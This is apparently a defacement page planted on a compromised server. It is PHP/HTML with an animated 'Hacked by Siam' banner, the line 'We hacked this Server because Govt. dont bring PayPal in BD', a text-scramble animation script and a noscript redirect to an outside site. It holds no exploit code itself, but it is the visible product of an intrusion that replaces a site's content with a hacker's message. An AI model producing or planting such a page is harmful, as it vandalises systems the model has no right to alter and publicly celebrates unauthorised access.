<?php include_once('head.php'); ?>
<body>
    <div class="wrapper">
        <!-- Centered Logo -->
        <div class="logo-container">
            <img src="https://mr3xploiter.github.io/samam/pages/in-a-dramatic-illustration-with-a-dark-a_fDy-A6zbTjStYmxFa8cQGg_oumgpc5AR4iI67QLkYvaVw-removebg-preview.png" alt="Logo" id="logo">
        </div>
        
        <!-- Text Section (will be animated by TextScramble) -->
        <div class="text-container>
        <p id="tagline">GOT S3CUR1TY?</p>
            <div class="text">Hacked by Siam</div><br>
            
        </div>

        <!-- Footer Section -->
        <div id="footer" class="animated bounceIn">
            <h1 id="greyshadow">We hacked this Server because Govt. dont bring PayPal in BD</h1>
        </div>

        <br />
    </div>

    <noscript><meta http-equiv="refresh" content="0; URL=https://Siam.com/"></noscript>
    <script type="text/javascript">
        class TextScramble {
            constructor(el) {
                this.el = el
                this.chars = '~#!@$%^&*()_-=+{}:"|<>?,./;'
                this.update = this.update.bind(this)
            }

            setText(newText) {
                const oldText = this.el.innerText
                const length = Math.max(oldText.length, newText.length)
                const promise = new Promise((resolve) => this.resolve = resolve)
                this.queue = []
                for (let i = 0; i < length; i++) {
                    const from = oldText[i] || ''
                    const to = newText[i] || ''
                    const start = Math.floor(Math.random() * 40)
                    const end = start + Math.floor(Math.random() * 40)
                    this.queue.push({ from, to, start, end })
                }
                cancelAnimationFrame(this.frameRequest)
                this.frame = 0
                this.update()
                return promise
            }

            update() {
                let output = ''
                let complete = 0
                for (let i = 0, n = this.queue.length; i < n; i++) {
                    let { from, to, start, end, char } = this.queue[i]
                    if (this.frame >= end) {
                        complete++
                        output += to
                    } else if (this.frame >= start) {
                        if (!char || Math.random() < 0.28) {
                            char = this.randomChar()
                            this.queue[i].char = char
                        }
                        output += `<span class="silent">${char}</span>`
                    } else {
                        output += from
                    }
                }
                this.el.innerHTML = output
                if (complete === this.queue.length) {
                    this.resolve()
                } else {
                    this.frameRequest = requestAnimationFrame(this.update)
                    this.frame++
                }
            }

            randomChar() {
                return this.chars[Math.floor(Math.random() * this.chars.length)]
            }
        }

        const phrases = [
            'Hacked by Siam',
            'Hacked by Siam',
        ]

        const el = document.querySelector('.text')
        const fx = new TextScramble(el)

        let counter = 0
        const next = () => {
            fx.setText(phrases[counter]).then(() => {
                setTimeout(next, 3500)
            })
            counter = (counter + 1) % phrases.length
        }

        next()

        'use strict';

        var app = {
            chars: [''],

            init: function () {
                app.container = document.createElement('div');
                app.container.className = 'animation-container';
                document.body.appendChild(app.container);
                window.setInterval(app.add, 100);
            },

            add: function () {
                var element = document.createElement('span');
                app.container.appendChild(element);
                app.animate(element);
            },

            animate: function (element) {
                var character = app.chars[Math.floor(Math.random() * app.chars.length)];
                var duration = Math.floor(Math.random() * 15) + 1;
                var offset = Math.floor(Math.random() * (50 - duration * 2)) + 3;
                var size = 10 + (15 - duration);
                element.style.cssText = 'right:' + offset + 'vw; font-size:' + size + 'px; animation-duration:' + duration + 's';
                element.innerHTML = character;
                window.setTimeout(app.remove, duration * 100, element);
            },

            remove: function (element) {
                element.parentNode.removeChild(element);
            },

        };

        document.addEventListener('DOMContentLoaded', app.init);
    </script>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #111;
            color: #fff;
        }

        .wrapper {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .logo-container {
            margin-bottom: 30px;
        }

        #logo {
            width: 200px;
            height: auto;
        }

        .text-container {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .text {
            color: #FF5733;
        }

        #footer {
            margin-top: 20px;
        }

        #greyshadow {
            text-shadow: 5px 5px 15px rgba(0, 0, 0, 0.7);
        }

        .animation-container {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
        }

        .silent {
            visibility: hidden;
        }
    </style>
</body>
